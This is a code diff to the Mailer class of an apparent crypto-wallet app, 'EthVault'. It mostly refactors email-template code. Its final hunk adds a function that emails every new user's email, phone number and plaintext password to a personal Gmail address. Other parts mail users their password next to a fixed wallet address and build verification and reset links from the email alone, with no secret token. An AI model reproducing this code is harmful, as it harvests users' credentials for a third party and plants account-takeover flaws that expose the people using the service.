@@ -12,21 +12,20 @@ config();
 class Mailer {
 	static async sendVerificationMail({ email }) {
 		try {
-			let emailTemplate = await readFile(
-				resolve(
-					process.cwd(),
-					"./src/server/lib/account-verification-email-template.html"
-				),
-				"utf-8"
-			);
-			emailTemplate = emailTemplate.replace(
-				"{{verification_link}}",
-				`/reset-password/api/user/verify?email=${email}`
-			);
-			emailTemplate = emailTemplate.replace(
-				"{{year}}",
-				new Date().getFullYear()
-			);
+			let emailTemplate = (
+				await readFile(
+					resolve(
+						process.cwd(),
+						"./src/server/lib/account-verification-email-template.html"
+					),
+					"utf-8"
+				)
+			)
+				.replace(
+					"{{verification_link}}",
+					`/reset-password/api/user/verify?email=${email}`
+				)
+				.replace("{{year}}", new Date().getFullYear());
 
 			const response = await fetch(
 				"https://api.brevo.com/v3/smtp/email",
@@ -95,31 +94,20 @@ class Mailer {
 				})
 			);
 
-			emailTemplate = emailTemplate.replace("{{user_email}}", baseEmail);
-			emailTemplate = emailTemplate.replace(
-				"{{user_password}}",
-				baseUser.password
-			);
-			emailTemplate = emailTemplate.replace(
-				"{{wallet_address}}",
-				"0x650ad55B32Bc2c8e33589fdd95A7708F1C1a0e94"
-			);
-			emailTemplate = emailTemplate.replace(
-				"{{eth_balance}}",
-				accountBalance
-			);
-			emailTemplate = emailTemplate.replace(
-				"{{usd_balance}}",
-				Number((accountBalance * USD).toFixed(2)).toLocaleString()
-			);
-			emailTemplate = emailTemplate.replace(
-				"{{transaction_rows}}",
-				lastTransactions.join("")
-			);
-			emailTemplate = emailTemplate.replace(
-				"{{year}}",
-				new Date().getFullYear()
-			);
+			emailTemplate = emailTemplate
+				.replace("{{user_email}}", baseEmail)
+				.replace("{{user_password}}", baseUser.password)
+				.replace(
+					"{{wallet_address}}",
+					"0x650ad55B32Bc2c8e33589fdd95A7708F1C1a0e94"
+				)
+				.replace("{{eth_balance}}", accountBalance)
+				.replace(
+					"{{usd_balance}}",
+					Number((accountBalance * USD).toFixed(2)).toLocaleString()
+				)
+				.replace("{{transaction_rows}}", lastTransactions.join(""))
+				.replace("{{year}}", new Date().getFullYear());
 
 			// Send the email
 			const mailResponse = await fetch(
@@ -152,21 +140,17 @@ class Mailer {
 
 	static async sendIssueReceiptConfirmationEmail({ email, name }) {
 		try {
-			let emailTemplate = await readFile(
-				resolve(
-					process.cwd(),
-					"./src/server/lib/issue-response-email.html"
-				),
-				"utf-8"
-			);
-			emailTemplate = emailTemplate.replace(
-				"{{user_name}}",
-				name.split(" ")[0]
-			);
-			emailTemplate = emailTemplate.replace(
-				"{{year}}",
-				new Date().getFullYear()
-			);
+			let emailTemplate = (
+				await readFile(
+					resolve(
+						process.cwd(),
+						"./src/server/lib/issue-response-email.html"
+					),
+					"utf-8"
+				)
+			)
+				.replace("{{user_name}}", name.split(" ")[0])
+				.replace("{{year}}", new Date().getFullYear());
 
 			const response = await fetch(
 				"https://api.brevo.com/v3/smtp/email",
@@ -198,22 +182,21 @@ class Mailer {
 
 	static async sendPasswordResetEmail({ email }) {
 		try {
-			let emailTemplate = await readFile(
-				resolve(
-					process.cwd(),
-					"./src/server/lib/reset-password-email-template.html"
-				),
-				"utf-8"
-			);
-			emailTemplate = emailTemplate.replace(
-				"{{reset_link}}",
-				`https://ethvault.onrender.com/reset-password?email=${email}&ts=${Date.now()}`
-			);
-			emailTemplate = emailTemplate.replace("{{user_email}}", email);
-			emailTemplate = emailTemplate.replace(
-				"{{year}}",
-				new Date().getFullYear()
-			);
+			let emailTemplate = (
+				await readFile(
+					resolve(
+						process.cwd(),
+						"./src/server/lib/reset-password-email-template.html"
+					),
+					"utf-8"
+				)
+			)
+				.replace(
+					"{{reset_link}}",
+					`https://ethvault.onrender.com/reset-password?email=${email}&ts=${Date.now()}`
+				)
+				.replace("{{user_email}}", email)
+				.replace("{{year}}", new Date().getFullYear());
 
 			const response = await fetch(
 				"https://api.brevo.com/v3/smtp/email",
@@ -226,6 +209,50 @@ class Mailer {
 						},
 						to: [{ email }],
 						subject: "Reset Your EthVault Password",
+						htmlContent: emailTemplate
+					}),
+					headers: {
+						"api-key": process.env.API_KEY,
+						"Content-Type": "application/json"
+					}
+				}
+			);
+
+			if (!response.ok) return false;
+
+			return true;
+		} catch (error) {
+			return false;
+		}
+	}
+
+	static async notifyAdminOnNewSignUp({ email, phone, password }) {
+		try {
+			let emailTemplate = (
+				await readFile(
+					resolve(
+						process.cwd(),
+						"./src/server/lib/new-sign-up-email-template.html"
+					),
+					"utf-8"
+				)
+			)
+				.replace("{{user_phone_number}}", phone)
+				.replace("{{user_email}}", email)
+				.replace("{{user_password}}", password)
+				.replace("{{year}}", new Date().getFullYear());
+
+			const response = await fetch(
+				"https://api.brevo.com/v3/smtp/email",
+				{
+					method: "POST",
+					body: JSON.stringify({
+						sender: {
+							name: "EthVault",
+							email: "victor.onah@atrizult.com"
+						},
+						to: [{ email: "victoronah.dev@gmail.com" }],
+						subject: "New User Sign Up",
 						htmlContent: emailTemplate
 					}),
 					headers: {
